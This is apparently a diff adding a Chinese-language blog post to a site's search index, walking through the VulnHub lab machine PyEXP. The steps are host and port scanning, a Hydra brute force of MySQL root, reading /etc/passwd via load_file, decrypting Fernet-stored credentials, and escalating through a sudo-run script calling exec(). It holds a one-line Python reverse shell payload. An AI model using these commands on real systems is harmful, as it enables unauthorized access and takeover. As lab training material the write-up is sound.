@@ -858,4 +858,62 @@
         <tag>Vulnhub-middlum</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PyEXP</title>
+    <url>/2022/01/26/pyexp/pyexp/</url>
+    <content><![CDATA[<h1 id="PyEXP打靶"><a href="#PyEXP打靶" class="headerlink" title="PyEXP打靶"></a>PyEXP打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>这台靶机没有存在 <code>web</code>服务，也就是说，之前的套路就不太好使了</p>
+<p>应用技术：</p>
+<p>mysql暴力破解</p>
+<p>加解密</p>
+<p>python危险函数</p>
+<hr>
+<p>本机IP：<em>kali Linux 2021</em> 192.168.0.103</p>
+<p>目标IP：<em>Linux 192.168.0.101</em></p>
+<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.101	00:0c:29:03:34:99	VMware, Inc.</span><br><span class="line">192.168.0.102	b4:2e:99:95:70:6a	GIGA-BYTE TECHNOLOGY CO.,LTD.</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>使用nmap扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -p- -sV 192.168.0.101 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-25 21:47 EST</span><br><span class="line">Nmap scan report for quic.nagini.hogwarts (192.168.0.101)</span><br><span class="line">Host is up (0.0033s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了 1337(ssh），3306（Mysql）</p>
+<h3 id="3-暴力破解"><a href="#3-暴力破解" class="headerlink" title="3.暴力破解"></a>3.暴力破解</h3><p>既然没有80端口，那只好对ssh或mysql进行暴力破解了</p>
+<p>使用 <code>Hydra</code>进行暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<p>很快，<code>hydra</code>就返回了破解结果，用户<code>root</code> 密码 <code>prettywoman</code></p>
+<p>使用以下命令登录目标mysql服务</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<p>登录成功后首先尝试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201261458284.jpg"></p>
+<p>使用<code>、!</code>方式执行系统命令，但是在尝试之后发现只能执行自己的操作系统命令只能尝试使用其他方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\! id</span><br><span class="line">select do_system(&#x27;id&#x27;);			#执行id命令</span><br><span class="line">select load_file(&#x27;/etc/passwd&#x27;)	#读取系统文件</span><br></pre></td></tr></table></figure>
+
+<p>以上三种方式是在入侵mysql之后可以进行的尝试！</p>
+<p>而在本次打靶中，以上三种方法都没有用，只好查看他是数据库有什么内容了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from data.fernet;</span><br></pre></td></tr></table></figure>
+
+<p>得到了两串密文</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">UJ5<span class="built_in">_</span>V<span class="built_in">_</span>b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= <span class="params">#</span>密钥</span><br><span class="line">gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO<span class="built_in">_</span>cHnJQF1<span class="built_in">_</span>ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh<span class="built_in">_</span>z<span class="built_in">_</span>eI7ys= <span class="params">#</span>密文</span><br></pre></td></tr></table></figure>
+
+<p>在通过百度后得知，<code>fernet</code>是一种加密格式，其加解密的方法是利用python</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet	<span class="comment">#导入模块</span></span><br><span class="line">key = Fernet.generate_key()				<span class="comment">#随机生成密钥</span></span><br><span class="line">f = Fernet(key)							<span class="comment">#实例化</span></span><br><span class="line">token = f.encrypt(<span class="string">b&#x27;My deep dark secret!&#x27;</span>)	<span class="comment">#加密</span></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">f.decrypt(token)						<span class="comment">#解密</span></span><br></pre></td></tr></table></figure>
+
+<p>解密后的数据如下</p>
+<p><strong>lucy:wJ9`”Lemdv9[FEw-</strong></p>
+<p>很明显，这是一个登录密钥</p>
+<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>关于<code>python</code>的危险函数 <code>exec()</code></p>
+<p>目标在登录后，允许以root执行exp.py文件，查看<code>exp.py</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure>
+
+<p>很简单的2行代码，在<code>exec()</code>可以执行任何我想执行的python代码，那么nc监听，提交</p>
+<p><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.103&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)</code>这段参数，即可反弹shell</p>
+<p>打靶结束！</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
 </search>
